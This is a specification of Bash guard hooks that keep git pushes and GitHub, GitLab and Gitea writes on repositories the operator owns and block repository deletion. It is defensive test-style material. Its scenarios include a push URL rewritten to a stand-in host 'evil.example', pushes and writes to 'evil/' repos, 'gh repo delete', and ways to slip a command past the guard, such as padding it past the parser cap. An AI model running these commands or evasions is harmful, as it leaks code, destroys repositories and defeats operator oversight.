# repo-ownership Specification

## Purpose
Repo ownership is the set of Bash hooks that keep writes on repositories the operator owns, refuse repository deletion, and advise when a repo is created or published: `cadence-hooks guardrails guard-push-remote`, `cadence-hooks guardrails guard-gh-write`, `cadence-hooks guardrails guard-forge-write`, `cadence-hooks guardrails guard-gh-dangerous`, `cadence-hooks guardrails inject-gh-write-context`, `cadence-hooks guardrails guard-git-init` and `cadence-hooks guardrails warn-going-public`.

## Requirements

### Requirement: Owner allowlist
The ownership guards SHALL read the operator's owners from `CADENCE_ALLOWED_OWNERS` and `owner/repo` pairs from `CADENCE_ALLOWED_REPOS` in the hook process environment, each a space- or comma-separated list matched case-insensitively. A bare entry MUST match only the default host (`GH_HOST`, else `github.com`) and hosts in `CADENCE_EXTRA_HOSTS`. A host-qualified entry (`host/owner`) MUST match only its own host. An inline prefix on the command MUST NOT change a verdict.

#### Scenario: Bare entry on the default host
- **WHEN** `CADENCE_ALLOWED_OWNERS=cameronsjo` and a push targets `https://github.com/CameronSjo/tool.git`
- **THEN** the target counts as owned

#### Scenario: Bare entry on a self-hosted forge
- **WHEN** `CADENCE_ALLOWED_OWNERS=cameron`, `CADENCE_EXTRA_HOSTS` is unset, and a push targets `https://git.example.com/cameron/tool.git`
- **THEN** the push blocks, and the reason suggests qualifying the entry as `git.example.com/<owner>` or setting `CADENCE_EXTRA_HOSTS=git.example.com`

#### Scenario: Repo entry
- **WHEN** `CADENCE_ALLOWED_REPOS=external/shared-repo` and a write targets `external/shared-repo`
- **THEN** the target counts as owned while every other `external/*` repo does not

### Requirement: Push to a repository the operator does not own
`guard-push-remote` (PreToolUse, Bash) SHALL block (exit 2, `Push target is not yours`) a `git push` to a repository outside the allowlist. It MUST judge every destination: an explicit URL directly, a named remote through git's push URL, a bare push through the tracking remote, each in the directory the push runs in (`cd <dir> &&`, `git -C <dir>`, `bash -c`). A push whose targets are all owned, and a command with no push, SHALL be allowed.

#### Scenario: Ordinary push to an owned remote
- **WHEN** `git push origin feat/x` runs in a checkout whose `origin` is an owned GitHub repo
- **THEN** the hook exits 0 with no output

#### Scenario: Push to an unowned URL
- **WHEN** the command is `git push https://github.com/someone-else/repo.git main`
- **THEN** the hook exits 2 and the reason names the URL, the directory and the allowed entries

#### Scenario: Push text that is not a push
- **WHEN** the command is `git commit -m "remember to git push https://github.com/x/y.git"`
- **THEN** the hook allows

#### Scenario: Chained pushes to owned remotes
- **WHEN** the command is `git push origin main && git push backup main` and both remotes are owned
- **THEN** the hook allows, each push judged on its own target

### Requirement: Push shapes the push guard refuses
`guard-push-remote` SHALL block a push whose target it read as uncertain. In a command the loop parser reads: a looped push with no remote, or a bare push in a push chain that may switch branch or tracking. In any command: a URL with no `owner/repo`, a repository moved by `eval`, `trap`, `GIT_DIR`, `--git-dir` or `--work-tree`, a push URL the command rewrites, or a remote git cannot resolve.

#### Scenario: Loop with no remote
- **WHEN** the command is `for b in a b; do git push; done`
- **THEN** the hook exits 2 with `git push in loop without explicit remote`

#### Scenario: Bare push in a chain that switches branch
- **WHEN** the command is `git push origin feat && git checkout main && git push`
- **THEN** the hook exits 2 with `chained git push without explicit remotes`

#### Scenario: Rewritten push URL
- **WHEN** the command is `git -c url.https://evil.example/.insteadOf=https://github.com/ push origin main`
- **THEN** the hook exits 2 with `Cannot tell where this push goes`

#### Scenario: No push remote
- **WHEN** a bare `git push` runs in a repository with no `origin` and no configured push remote for the branch
- **THEN** the hook exits 2 with `Cannot resolve push target`

### Requirement: How many pushes the push guard checks
`guard-push-remote` SHALL block over four non-URL remotes in a loop the parser reads, over four directory and remote pairs outside the command's last directory, or over four directory and remote pairs that `-c` config or an earlier config write names. A literal `git -C` push loop SHALL be checked per iteration instead, as "Literal `git -C` push loops" says.

#### Scenario: Pushes in five directories
- **WHEN** the command is `git -C d1 push origin main && git -C d2 push origin main && git -C d3 push origin main && git -C d4 push origin main && git -C d5 push origin main`
- **THEN** the hook exits 2 with `too many push directories to verify`

#### Scenario: Five remotes in a loop
- **WHEN** the command is `for b in a b; do git push r1 $b; git push r2 $b; git push r3 $b; git push r4 $b; git push r5 $b; done`
- **THEN** the hook exits 2 with `too many push-loop remotes to verify`

#### Scenario: Five config-named remotes
- **WHEN** the command is `git -c remote.pushDefault=r1 push && git -c remote.pushDefault=r2 push && git -c remote.pushDefault=r3 push && git -c remote.pushDefault=r4 push && git -c remote.pushDefault=r5 push` and each remote is owned
- **THEN** the hook exits 2 with `too many push remotes to verify`

### Requirement: Literal `git -C` push loops
A command of at most 4096 bytes that begins with `for` and is one loop over literal words, whose every push is `git -C DIR push REMOTE`, SHALL have each iteration's remote resolved and owner-checked by `guard-push-remote` instead of meeting the loop caps, for up to four directories and eight pushes. A larger loop, or one with anything before it, SHALL be judged as any other loop.

#### Scenario: Five remotes in a literal `git -C` loop
- **WHEN** the command is `for d in d1; do git -C $d push r1 main; git -C $d push r2 main; git -C $d push r3 main; git -C $d push r4 main; git -C $d push r5 main; done` and each remote is owned
- **THEN** the hook exits 0

#### Scenario: Comment before a literal loop
- **WHEN** a `# push all` line comes before the loop in "Five remotes in a literal `git -C` loop"
- **THEN** the hook exits 2 with `too many push-loop remotes to verify`

### Requirement: Push directory or target built at run time
`guard-push-remote` SHALL nudge, not block, when an otherwise allowed push follows a directory change the shell resolves at run time (`cd "$VAR"`, `cd -`, `cd $(...)`, `popd`, a bare `cd`, `git -C "$D"`), naming the directory it checked instead. It SHALL also nudge when a push names a destination built at run time and the tracking remote it checked instead is owned, unless a URL readable in the command is unowned, which blocks.

#### Scenario: Variable directory
- **WHEN** the command is `cd "$REPO" && git push origin main` from an owned checkout
- **THEN** the hook exits 0 with a `Push directory could not be verified` nudge naming the checked directory

#### Scenario: Variable remote
- **WHEN** the command is `git push "$REMOTE" main` and the tracking remote is owned
- **THEN** the hook exits 0 with a nudge that the push target is resolved by the shell

### Requirement: Push guard configuration and probe failures
`guard-push-remote` SHALL block every push it reaches with `Not configured` when `CADENCE_ALLOWED_OWNERS` is empty. It SHALL allow a push from a directory that is not a git repository. When a single push's ownership probe exceeds the git-probe deadline (`CADENCE_HOOK_DEADLINE_MS`) it MUST allow; when a looped or multi-directory push's probe times out it MUST block and ask for each push to run on its own.

#### Scenario: Unconfigured machine
- **WHEN** `CADENCE_ALLOWED_OWNERS` is unset and the command is `git push origin main`
- **THEN** the hook exits 2 with a reason naming `CADENCE_ALLOWED_OWNERS is not set`

#### Scenario: Not a repository
- **WHEN** an owner list is set and `git push origin main` runs in a directory with no git repository
- **THEN** the hook allows

### Requirement: gh write to a repository the operator does not own
`guard-gh-write` (PreToolUse, Bash) SHALL block (exit 2, `gh write targets repo you don't own`) a `gh` write on a repository outside the allowlist, judging each segment of a chain on its own target. The target SHALL be read from a PR or issue URL argument, `-R`/`--repo`, a `GH_REPO` assignment, a `gh repo` verb's positional `owner/repo`, a `gh api repos/<owner>/<repo>/...` path, and otherwise the git remotes of the directory the segment runs in. Reads SHALL be allowed whatever the target.

#### Scenario: Ordinary write with an owned target
- **WHEN** the command is `gh pr create -R cameronsjo/tool --title t --body-file b.md` and `cameronsjo` is allowed
- **THEN** the hook allows

#### Scenario: Unowned write after an owned one
- **WHEN** the command is `gh issue comment 1 -R cameronsjo/tool --body ok && gh issue comment 2 -R evil/repo --body x`
- **THEN** the hook exits 2 naming `evil/repo` and the allowed entries

#### Scenario: Read on an unowned repo
- **WHEN** the command is `gh pr view 5 -R someone/else` or `gh repo clone someone/else`
- **THEN** the hook allows

### Requirement: What counts as a gh write
`guard-gh-write` SHALL treat as writes: `gh pr|issue|release|label|repo|gist|workflow` with a mutating verb (`create`, `merge`, `close`, `comment`, `edit`, `delete`, `review`, `ready`, `reopen`, `lock`, `archive`, `rename`, `transfer`, `fork`, `run`, `enable`, `disable`), `gh secret|variable set|delete`, `gh release upload`, `gh label clone`, and `gh api` with a mutating `-X`/`--method`, a field flag or `--input`, unless an explicit `GET` method is given.

#### Scenario: API field write
- **WHEN** the command is `gh api repos/evil/repo/issues -f title=x`
- **THEN** the hook exits 2

#### Scenario: Explicit GET with fields
- **WHEN** the command is `gh api repos/evil/repo/issues -X GET -f state=open`
- **THEN** the hook allows

### Requirement: gh writes the guard cannot place
`guard-gh-write` SHALL block a write it cannot place on an owned repository: no `-R` and no resolvable remote (`Cannot determine target repo for gh write operation`), an unparseable or ambiguous `-R`, an unexpanded variable target, a fork checkout with an unowned fork or upstream, a `gh api` write outside `repos/<owner>/<repo>` and an allowed owner's `orgs/<org>`, a GraphQL mutation, and a command too large or nested to read. Each reason SHALL name a concrete fix.

#### Scenario: Write with no resolvable target
- **WHEN** `gh issue create --title t` runs in a directory with no git remote
- **THEN** the hook exits 2 and the reason tells the operator to add `-R <owner>/<repo>`

#### Scenario: GraphQL read and thread resolution
- **WHEN** the command is `gh api graphql -f query='query { viewer { login } }'` or a `resolveReviewThread` mutation
- **THEN** the hook allows

#### Scenario: Unconfigured machine
- **WHEN** `CADENCE_ALLOWED_OWNERS` is unset and the command is `gh pr merge 5 -R cameronsjo/tool`
- **THEN** the hook exits 2 with `Not configured`

### Requirement: gh writes allowed without an ownership check
`guard-gh-write` SHALL allow `gh gist` writes and `gh repo fork` (they land under the operator's account) and `gh issue create --web`/`-w` unless the command sets `BROWSER=` or `GH_BROWSER=`. A loop of writes with no `-R` SHALL be allowed when its body never changes directory and the directory resolves to an owned non-fork repository; with `CADENCE_GH_STRICT_LOOPS=1` it MUST block and suggest the resolved `-R`. An ownership probe past the git-probe deadline MUST allow.

#### Scenario: Gist from an unowned checkout
- **WHEN** `gh gist create notes.md` runs in a checkout whose remote is unowned
- **THEN** the hook allows

#### Scenario: Strict loops
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and the command is `for n in 1 2; do gh issue close $n; done` in an owned checkout
- **THEN** the hook exits 2 and the reason suggests the resolved `-R owner/repo`

### Requirement: Untargeted gh write context
`inject-gh-write-context` (PreToolUse, Bash) SHALL nudge on every `gh` write segment that names no target (no `-R`, no `repos/owner/repo` path, no positional repo), restating that writes are allowlist-policed, that `-R owner/repo` should always be passed, and the allowed owners or that none are configured. It MUST repeat on every such write, MUST NOT block, and SHALL stay silent on reads and on writes that name their target.

#### Scenario: Bare write
- **WHEN** the command is `gh pr create --title t --body-file b.md`
- **THEN** the hook exits 0 with context naming `-R owner/repo` and the allowed owners

#### Scenario: Targeted write
- **WHEN** the command is `gh pr create -R cameronsjo/tool --title t --body-file b.md` with no bare `#N` in the body
- **THEN** the hook exits 0 with no output

### Requirement: Bare issue reference in a retargeted body
`inject-gh-write-context` SHALL nudge when `gh issue create|edit|comment` or `gh pr create|edit|comment|review` posts with `-R other/repo` a body holding a bare `#N` and `other/repo` is not the `origin` of the checkout the command runs in, advising `owner/repo#N`. It SHALL stay silent when no origin can be read.

#### Scenario: Cross-repo body
- **WHEN** the checkout's origin is `cameronsjo/cadence` and the command is `gh issue comment 4 -R cameronsjo/forgectl --body "see #12"`
- **THEN** the hook exits 0 with a nudge that a bare `#12` resolves against `cameronsjo/forgectl`

### Requirement: tea and glab writes
`guard-forge-write` (PreToolUse, Bash) SHALL block (exit 2) a `tea` or `glab` write whose `-R`/`--repo` target is outside the allowlist or cannot be read, and SHALL allow reads and any verb outside its write table. A bare target MUST match a bare entry only on a host in `CADENCE_EXTRA_HOSTS`, never on the GitHub default host; for `glab` it also matches a `gitlab.com/<owner>` entry. With no allowlist every write it reaches MUST block. `glab api` and `tea api` SHALL be allowed.

#### Scenario: Unowned GitLab write
- **WHEN** the command is `glab mr create -R evil/r --title t`
- **THEN** the hook exits 2 naming `glab write targets` and the allowed entries

#### Scenario: GitLab read
- **WHEN** the command is `glab mr list -R evil/r`
- **THEN** the hook allows

### Requirement: Repository deletion
`guard-gh-dangerous` (PreToolUse, Bash) SHALL block (exit 2, `gh repo delete is blocked`) `gh repo delete` and `gh api -X DELETE repos/<owner>/<repo>` on any repository, owned or not, including inside shell wrappers, a literal piped into a shell, and quoted or brace-built spellings the shell runs as a delete. It SHALL block a `gh` command too large to read when its text could spell a delete. Other `gh` commands, and the phrase in quoted prose, SHALL be allowed.

#### Scenario: Owned repo deletion
- **WHEN** the command is `gh repo delete cameronsjo/tool --yes` and `cameronsjo` is allowed
- **THEN** the hook exits 2 with a fix to delete manually on github.com

#### Scenario: Ordinary gh command
- **WHEN** the command is `gh repo view cameronsjo/tool`
- **THEN** the hook allows

#### Scenario: API delete of a sub-resource
- **WHEN** the command is `gh api -X DELETE repos/cameronsjo/tool/labels/bug`
- **THEN** `guard-gh-dangerous` allows

### Requirement: Protected ownership guards
`CADENCE_DISABLE` MUST NOT switch off `guard-push-remote`, `guard-gh-write` or `guard-gh-dangerous`: the name is reported as refused and the guard still runs. `CADENCE_BYPASS=1` SHALL switch them off. `guard-forge-write`, `inject-gh-write-context`, `guard-git-init` and `warn-going-public` SHALL honour `CADENCE_DISABLE`. Every hook here SHALL run unchanged under `CLAUDE_CODE_REMOTE=true`.

#### Scenario: Disable refused
- **WHEN** `CADENCE_DISABLE=guard-gh-write` and the command writes to an unowned repo
- **THEN** the write still blocks

### Requirement: New repository reminder
`guard-git-init` (PostToolUse, Bash) SHALL nudge after `git init` or `gh repo create` to run `/a-star-is-born` and to confirm the license with the author before assuming one. A `git init` whose every created repository resolves under a temp root (`$TMPDIR`, `/tmp`, a `mktemp -d` path) SHALL be silent; `gh repo create` MUST nudge from any directory. It MUST NOT block and SHALL ignore the commands inside quoted prose.

#### Scenario: Real project
- **WHEN** `git init ~/Projects/new-tool` completes
- **THEN** the hook exits 0 with context naming `/a-star-is-born` and the license decision

#### Scenario: Test fixture
- **WHEN** `d=$(mktemp -d) && git init "$d"` completes
- **THEN** the hook exits 0 with no output

### Requirement: Going-public term scan
`warn-going-public` (PreToolUse, Bash) SHALL nudge, never block, when `gh repo create` (any visibility), `gh repo rename`, or `gh repo edit` with a public visibility carries a name or `--description` matching a compiled home-media term (the `*arr` family and similar), a `CADENCE_GOING_PUBLIC_TERMS` term, or a work term from `~/.config/cadence/redaction.toml`. Any parse problem SHALL allow.

#### Scenario: Sensitive name
- **WHEN** the command is `gh repo create sonarr-stack --public`
- **THEN** the hook exits 0 with a nudge naming `sonarr` and `CADENCE_GOING_PUBLIC_IGNORE`

#### Scenario: Neutral repository
- **WHEN** the command is `gh repo create cli-tools --public --description "small shell helpers"`
- **THEN** the hook exits 0 with no output

### Requirement: Going-public relief
`CADENCE_GOING_PUBLIC_IGNORE` SHALL relieve compiled and `CADENCE_GOING_PUBLIC_TERMS` terms and MUST NOT relieve a `redaction.toml` term, which only that file's own `allow` entries relieve. Both variables MUST be read from the session environment, not from an inline prefix on the command.

#### Scenario: Inline ignore prefix
- **WHEN** the command is `CADENCE_GOING_PUBLIC_IGNORE=sonarr gh repo create sonarr-stack` and the session environment does not set it
- **THEN** the hook still nudges

### Requirement: gh writes in a loop the parser cannot read
`guard-gh-write` MUST NOT block a loop the loop parser cannot read (past its 12 KB cap or time budget, or a syntax error) for that alone. It SHALL judge each gh write in the loop on its own, as outside a loop, and SHALL nudge on a judged write with no `-R`, `gh repo` positional `owner/repo`, `GH_REPO` or literal `repos/<owner>/<repo>/…` path, naming `-R owner/repo`. Under `CADENCE_GH_STRICT_LOOPS=1`, "Strict loops the parser cannot read" decides instead.

#### Scenario: Unreadable loop with an unowned target
- **WHEN** a comment takes `for i in 1 2; do gh issue close $i -R evil/x; done` past 12 KB
- **THEN** the hook exits 2 because the write targets a repo the operator does not own

#### Scenario: Unreadable loop with a directory it cannot follow
- **WHEN** a comment takes `for d in a b; do cd "$d"; gh issue close 1; done` past 12 KB, in an owned checkout
- **THEN** the hook exits 2 because the write's directory cannot be resolved

#### Scenario: Unreadable loop of targeted writes or reads
- **WHEN** a comment takes `for i in 1 2; do gh issue close $i -R cameronsjo/tool; done`, `for r in a b; do gh repo edit cameronsjo/tool --description $r; done` or `for i in 1 2; do gh pr view $i; done` past 12 KB
- **THEN** the hook allows with no output

#### Scenario: Unreadable loop with a write that names no target
- **WHEN** a comment takes `for i in 1 2; do gh issue close $i; done` past 12 KB, in an owned checkout
- **THEN** the hook exits 0 with a nudge to give every gh write in the loop `-R owner/repo`

#### Scenario: Strict loops past the parse cap
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and a comment takes `for n in 1 2; do gh issue close $n; done` past 12 KB, in an owned checkout
- **THEN** the hook exits 2 and the reason tells the operator to give every gh write in the loop `-R owner/repo`

#### Scenario: Strict loops past the parse cap with targets
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and a comment takes `for n in 1 2; do gh issue close $n -R cameronsjo/tool; done` past 12 KB
- **THEN** the hook allows

### Requirement: gh writes in a loop the parser reads
In a loop the loop parser reads, `guard-gh-write` MUST block a gh write with no `-R` when the loop body changes directory or the directory does not resolve to an owned non-fork repository, and the reason SHALL name `-R` as the fix.

#### Scenario: Loop that changes directory
- **WHEN** the command is `for d in a b; do cd $d; gh issue close 1; done` in an owned checkout
- **THEN** the hook exits 2 and the reason tells the operator to add `-R`

#### Scenario: Loop in an unowned checkout
- **WHEN** the command is `for n in 1 2; do gh issue close $n; done` in a checkout whose remote is unowned
- **THEN** the hook exits 2

### Requirement: Strict loops the parser cannot read
With `CADENCE_GH_STRICT_LOOPS=1`, `guard-gh-write` MUST block a command the loop parser cannot read when it shows a `for … in` or `while …; do` loop and holds a write judged for ownership that has no `-R`, `gh repo` positional `owner/repo` or literal `repos/<owner>/<repo>/…` path; a `GH_REPO` does not count. A write allowed without an ownership check stays allowed.

#### Scenario: Strict loops past the parse cap with a positional repo
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and a comment takes `for r in a b; do gh repo edit cameronsjo/tool --description $r; done` past 12 KB
- **THEN** the hook allows

#### Scenario: Strict loops past the parse cap with a gist
- **WHEN** `CADENCE_GH_STRICT_LOOPS=1` and a comment takes `for i in 1 2; do gh gist create f$i.md; done` past 12 KB
- **THEN** the hook allows

### Requirement: Pushes in a chain or loop the parser cannot read
`guard-push-remote` MUST NOT block a chain of pushes or a loop holding a push for that alone when the loop parser cannot read the command (past its 12 KB cap, a heredoc or syntax error it cannot parse, or its 1 s parse budget). It SHALL still check each push it can read, a bare one against the branch checked out now, and a push to a remote the operator does not own SHALL still block.

#### Scenario: Unreadable chain of owned pushes
- **WHEN** a comment takes `git push origin main && git push origin main:feat` past 12 KB, in an owned checkout
- **THEN** the hook exits 0 with a nudge, not a block

#### Scenario: Unreadable chain with an unowned push
- **WHEN** a comment takes `git push origin main && git push https://github.com/evil/x.git main` past 12 KB, in an owned checkout
- **THEN** the hook exits 2 because the second push targets a remote the operator does not own

#### Scenario: Unreadable loop pushing to an unowned remote
- **WHEN** a comment takes `for b in main feat; do git push https://github.com/evil/x.git $b; done` past 12 KB
- **THEN** the hook exits 2 because the push targets a remote the operator does not own

### Requirement: Nudges for pushes in a chain or loop the parser cannot read
`guard-push-remote` SHALL nudge several pushes in a command the loop parser cannot read, naming the cause (size, a heredoc or syntax error, or parse time) and the action (shorten the command, or run each push as its own command). For a command that holds a loop it SHALL nudge to give every push in the command an explicit remote when a push names no remote or one only the shell resolves (`$r`, a backtick), and SHALL NOT nudge when every push names a literal remote.

#### Scenario: Unreadable chain
- **WHEN** a comment takes `git push origin main && git push origin main:feat` past 12 KB, in an owned checkout
- **THEN** the hook exits 0 with a nudge whose cause line names the size, a heredoc or syntax error, and the parse time limit, and whose action says to shorten the command or run each push as its own command

#### Scenario: Unreadable loop with a push that names no remote
- **WHEN** a comment takes `for b in a b; do git push; done` past 12 KB, in an owned checkout
- **THEN** the hook exits 0 with a nudge to give every push in the command an explicit remote

#### Scenario: Unreadable loop with a push outside it that names no remote
- **WHEN** a comment takes `for b in a b; do git push origin $b; done; git push` past 12 KB, in an owned checkout
- **THEN** the hook exits 0 with a nudge to give every push in the command an explicit remote

#### Scenario: Unreadable loop of pushes that name a remote
- **WHEN** a comment takes `for b in main feat; do git push origin $b; done` past 12 KB, in an owned checkout
- **THEN** the hook allows with no output

### Requirement: Unparsed push nudges say which branch a bare push was checked on
`guard-push-remote`'s nudges for a command the loop parser cannot read SHALL say that a bare push was checked against the branch checked out before the command runs, since a `git checkout` in the same command can send it to another remote.

#### Scenario: Unreadable chain with a branch switch
- **WHEN** a comment takes `git push origin main && git checkout other && git push` past 12 KB, in an owned checkout
- **THEN** the hook exits 0 with a nudge that says a bare push was checked against the branch checked out now

### Requirement: gh write named by a PR or issue URL argument
On a `gh pr` or `gh issue` write verb that takes a `<number> | <url> | <branch>` argument, `guard-gh-write` SHALL judge the repo and host that a PR or issue URL in that argument names, read as gh reads it, before `-R`, `GH_REPO` and the checkout, and under `gh issue transfer` as well as them. An unowned one SHALL block with a fix that names no target. A URL given as a flag's value SHALL NOT count.

#### Scenario: Unowned PR URL past an owned target
- **WHEN** the command is `gh pr merge https://github.com/evil/repo/pull/1 --squash -R cameronsjo/tool`, in a checkout of `cameronsjo/tool`
- **THEN** the hook exits 2 naming `github.com/evil/repo`, and the fix asks the user to run the command and names no `cameronsjo/` repo

#### Scenario: Owned issue URL outside an owned checkout
- **WHEN** the command is `gh issue close https://github.com/cameronsjo/tool/issues/3`, in a checkout of `evil/repo` or in `/tmp`
- **THEN** the hook allows

#### Scenario: URL as a flag's value
- **WHEN** the command is `gh pr comment 5 --body https://github.com/evil/repo/pull/1`, in a checkout of `cameronsjo/tool`
- **THEN** the hook allows

#### Scenario: Owned issue URL in a transfer from an unowned checkout
- **WHEN** the command is `gh issue transfer https://github.com/cameronsjo/tool/issues/3 evil/repo`, in a checkout of `evil/repo`
- **THEN** the hook exits 2 naming `evil/repo`
